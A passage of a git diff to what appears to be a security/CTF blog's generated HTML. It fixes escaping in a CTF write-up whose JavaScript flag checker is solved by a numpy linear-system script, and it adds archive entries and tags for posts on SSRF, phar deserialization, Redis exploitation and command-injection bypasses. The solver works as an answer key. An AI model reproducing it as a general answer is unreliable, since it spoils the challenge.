125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]], n = 0; n &lt; 25; n++) {</p>
-<p>​            for (var i = 0, a = 0; a &lt; 25; a++) i += t[a] * o[n][a];</p>
+<p>​        for (var t = [], n = 0; n < 25; n++) t.push(e.charCodeAt(n));</p>
+<p>​        for (var r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259], o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]], n = 0; n < 25; n++) {</p>
+<p>​            for (var i = 0, a = 0; a < 25; a++) i += t[a] * o[n][a];</p>
 <p>​            if (i !== r[n]) return ! 1</p>
 <p>​        }</p>
 <p>​        return ! 0</p>
@@ -606,7 +613,7 @@ height:50vh;
 <p>​    o = np.array(o)</p>
 <p>​    r = np.array(r)</p>
 <p>​    x = np.linalg.solve(o,r)</p>
-<p>​    res = ‘’</p>
+<p>​    res = ''</p>
 <p>​    for i in x:</p>
 <p>​        res += chr(int(str(i)[0:-2]))</p>
 <p>​    print(res)</p>
@@ -1176,9 +1183,57 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 30
+        Total : 34
         </div>
         <!-- search  -->
         
@@ -1191,6 +1246,26 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/SSRF-Tips/">SSRF Tips</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/phar-与反序列化/">phar 与反序列化</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href="/2019/05/17/Redis-未授权访问相关利用/">Redis 未授权访问相关利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href="/2019/05/12/命令注入绕过总结/">命令注入总结</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1358,23 +1433,29 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
-    
         <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
         <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
         <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
     
-        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
+        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="总结"><span class="iconfont-archer">&#xe606;</span>总结</span>
     
         <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
     
         <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
     
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
